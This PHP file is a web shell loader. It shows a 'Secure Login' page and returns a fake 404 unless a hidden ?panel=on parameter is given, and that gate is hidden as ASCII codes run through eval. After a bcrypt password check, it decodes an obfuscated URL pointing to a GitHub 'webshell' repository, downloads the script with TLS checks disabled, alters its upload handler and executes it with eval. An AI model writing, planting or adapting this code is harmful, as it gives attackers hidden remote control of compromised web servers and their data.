<?php
session_start();

$ascii_code = [
    115,101,115,115,105,111,110,95,115,116,97,114,116,40,41,59,10,10,
    105,102,32,40,33,105,115,115,101,116,40,36,95,71,69,84,91,39,112,97,110,
    101,108,39,93,41,32,124,124,32,36,95,71,69,84,91,39,112,97,110,101,108,
    39,93,32,33,61,61,32,39,111,110,39,41,32,123,10,
    32,32,32,32,104,116,116,112,95,114,101,115,112,111,110,115,101,95,99,111,
    100,101,40,52,48,52,41,59,10,
    32,32,32,32,101,120,105,116,59,10,
    125,10
];

$code = '';
foreach ($ascii_code as $c) {
    $code .= chr($c);
}
eval($code);

function logon() {
    ?>
    <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Secure Login</title>

<style>
    :root {
        --bg: #000000;

        --fieldTop: #2d2d2d;
        --fieldBot: #141414;

        --border: rgba(255,255,255,0.18);
        --borderFocus: rgba(255,255,255,0.40);

        --text: #f2f2f2;
        --muted: #a9a9a9;

        --btnTop: #2a2a2a;
        --btnBot: #050505;
    }

    body {
        margin: 0;
        min-height: 100vh;
        display: grid;
        place-items: center;
        background: var(--bg);
        font-family: "Segoe UI", Arial, sans-serif;
        color: var(--text);
        overflow: hidden;
    }

    .wrap {
        width: min(420px, 92vw);
        text-align: center;
        position: relative;
    }

    .stack {
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 14px;
    }

    /* Password */
    .field {
        width: 92%;
        padding: 14px 16px;
        border-radius: 12px;
        border: 1px solid var(--border);
        background: linear-gradient(180deg, var(--fieldTop), var(--fieldBot));
        color: var(--text);
        font-size: 15px;
        outline: none;
        transition: 0.25s ease;
        box-shadow:
            inset 0 1px 0 rgba(255,255,255,0.10),
            0 10px 28px rgba(0,0,0,0.55);
    }

    .field::placeholder {
        color: rgba(255,255,255,0.55);
    }

    .field:focus {
        border-color: var(--borderFocus);
        box-shadow:
            inset 0 1px 0 rgba(255,255,255,0.14),
            0 0 0 4px rgba(255,255,255,0.06),
            0 14px 35px rgba(0,0,0,0.65);
    }

    /* Button */
    .btn {
        width: 72%;
        padding: 13px 16px;
        border: 1px solid rgba(255,255,255,0.12);
        border-radius: 12px;
        background: linear-gradient(180deg, var(--btnTop), var(--btnBot));
        color: #ffffff;
        font-size: 14px;
        letter-spacing: 1px;
        cursor: pointer;
        transition: 0.25s ease;
        box-shadow:
            inset 0 1px 0 rgba(255,255,255,0.10),
            0 14px 35px rgba(0,0,0,0.70);
    }

    .btn:hover {
        border-color: rgba(255,255,255,0.22);
        box-shadow:
            inset 0 1px 0 rgba(255,255,255,0.16),
            0 0 0 4px rgba(255,255,255,0.05),
            0 18px 45px rgba(0,0,0,0.75);
        transform: translateY(-1px);
    }

    .btn:active {
        transform: translateY(0);
        box-shadow:
            inset 0 1px 0 rgba(255,255,255,0.08),
            0 10px 25px rgba(0,0,0,0.65);
    }

    /* Footer berkilau */
    .footer {
        margin-top: 18px;
        font-size: 11px;
        letter-spacing: 2px;
        color: var(--muted);
        position: relative;
        display: inline-block;
        padding: 2px 6px;
        overflow: hidden;
    }

    .footer::after {
        content: "";
        position: absolute;
        inset: 0;
        left: -120%;
        width: 240%;
        background: linear-gradient(
            120deg,
            transparent 40%,
            rgba(255,255,255,0.85) 50%,
            transparent 60%
        );
        animation: shimmer 2.8s linear infinite;
        opacity: 0.55;
    }

    @keyframes shimmer {
        0% { transform: translateX(-35%); }
        100% { transform: translateX(35%); }
    }
</style>
</head>

<body>

<form method="post">
    <div class="wrap">
        <div class="stack">
            <input
                class="field"
                type="password"
                name="pass"
                placeholder="Password"
                required
                autofocus
                autocomplete="off"
            />

            <input class="btn" type="submit" value="Login" />
        </div>

        <div class="footer">© Dimax66 2026</div>
    </div>
</form>

</body>
</html>

    <?php
    exit;
}

$hash = '$2a$12$GU9e.lN1bbcu1KNB/I0DHOiB8H7AsZOlGnuMMWR4lVk2pKvdf8S5G';

if (!isset($_SESSION['hala_madrid'])) {
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $hash)) {
        $_SESSION['hala_madrid'] = true;
        header('Location: ' . $_SERVER['REQUEST_URI']);
        exit;
    } else {
        logon();
    }
}

function fetch_remote($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.5',
        'Connection: keep-alive',
    ]);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);

    $res = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code !== 200 || !$res || strlen($res) < 50) {
        error_log("Remote fetch failed: HTTP $http_code, length: " . strlen($res));
        return false;
    }
    return $res;
}

$ascii = [
    104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,
    101,114,99,111,110,116,101,110,116,46,99,111,109,47,104,97,99,107,110,99,
    111,114,112,47,119,101,98,115,104,101,108,108,47,109,97,105,110,47,97,108,
    102,97,101,110,99,45,110,111,112,97,115,115,46,112,104,112
];

$url = '';
foreach ($ascii as $c) {
    $url .= chr($c);
}

$payload = fetch_remote($url);

if ($payload !== false) {
    // Perbaikan 1: Tambahkan enctype hanya pada form pertama yang belum memiliki enctype
    if (strpos($payload, 'enctype=') === false) {
        $payload = preg_replace('/<form\b(?![^>]*enctype)/i', '<form enctype="multipart/form-data"', $payload, 1);
    }

    // Perbaikan 2: Ganti handler upload dengan validasi lengkap
    $replace_from = 'move_uploaded_file($file_tmp, $file_name);';
    $replace_to = <<<'EOD'
// Validasi upload yang komprehensif
$upload_field = 'file';
if (!isset($_FILES[$upload_field])) {
    echo '<p style="color:red;">Error: No file field detected</p>';
} else {
    $file_error = $_FILES[$upload_field]['error'] ?? UPLOAD_ERR_NO_FILE;
    $file_size = $_FILES[$upload_field]['size'] ?? 0;
    $is_valid_upload = ($file_error === UPLOAD_ERR_OK) && 
                       is_uploaded_file($file_tmp) && 
                       $file_size > 0 &&
                       $file_size <= 100 * 1024 * 1024; // Max 100MB

    if ($is_valid_upload) {
        // Sanitasi nama file
        $file_name = preg_replace('/[^a-zA-Z0-9._-]/', '_', basename($file_name));
        
        // Rename ekstensi PHP berbahaya
        if (preg_match('/\.(php\d?|phtml|phar|phps)$/i', $file_name)) {
            $file_name = preg_replace('/\.(php\d?|phtml|phar|phps)$/i', '.jpg', $file_name);
        }
        
        // Pastikan direktori tujuan writable
        $target_dir = dirname($file_name);
        if (!is_dir($target_dir) && !mkdir($target_dir, 0755, true)) {
            echo '<p style="color:red;">Error: Cannot create target directory</p>';
        } elseif (!is_writable($target_dir)) {
            echo '<p style="color:red;">Error: Target directory not writable</p>';
        } else {
            if (move_uploaded_file($file_tmp, $file_name)) {
                // Verifikasi ukuran file setelah upload
                if (filesize($file_name) === $file_size) {
                    echo '<p style="color:green;">✓ Upload successful (' . number_format($file_size) . ' bytes)</p>';
                } else {
                    @unlink($file_name);
                    echo '<p style="color:red;">Error: File size mismatch after upload</p>';
                }
            } else {
                echo '<p style="color:red;">Error: Failed to move uploaded file</p>';
                error_log("Move failed: tmp=$file_tmp, dest=$file_name, error=$file_error");
            }
        }
    } else {
        $error_messages = [
            UPLOAD_ERR_INI_SIZE => 'Error: File exceeds php.ini upload size',
            UPLOAD_ERR_FORM_SIZE => 'Error: File exceeds form MAX_FILE_SIZE',
            UPLOAD_ERR_PARTIAL => 'Error: File partially uploaded',
            UPLOAD_ERR_NO_FILE => 'Error: No file uploaded',
            UPLOAD_ERR_NO_TMP_DIR => 'Error: Missing temporary folder',
            UPLOAD_ERR_CANT_WRITE => 'Error: Failed to write file to disk',
            UPLOAD_ERR_EXTENSION => 'Error: File upload stopped by extension'
        ];
        $msg = $error_messages[$file_error] ?? "Upload error (code $file_error)";
        if ($file_size === 0) $msg .= ' | Empty file detected';
        echo "<p style=\"color:red;\">$msg</p>";
        error_log("Upload rejected: error=$file_error, size=$file_size, tmp=$file_tmp");
    }
}
EOD;

    $payload = str_replace($replace_from, $replace_to, $payload);
    
    // Fallback jika string tidak ditemukan (payload mungkin berubah)
    if ($payload === $replace_from) {
        error_log("CRITICAL: Upload handler replacement failed - payload structure changed");
        echo "<p style='color:red;font-weight:bold;'>System error: Upload handler mismatch. Contact administrator.</p>";
    } else {
        eval('?>' . $payload);
    }
} else {
    http_response_code(503);
    echo "<!DOCTYPE html>
    <html>
    <head><title>Service Unavailable</title></head>
    <body style='background:#1a1a1a;color:#e53935;text-align:center;padding:50px;font-family:monospace'>
        <h1>✗ SERVICE UNAVAILABLE</h1>
        <p>Core module failed to load</p>
        <p>Administrator has been notified</p>
        <small>" . date('Y-m-d H:i:s') . "</small>
    </body>
    </html>";
    error_log("CRITICAL: Failed to load remote payload from $url");
    exit(1);
}
?>
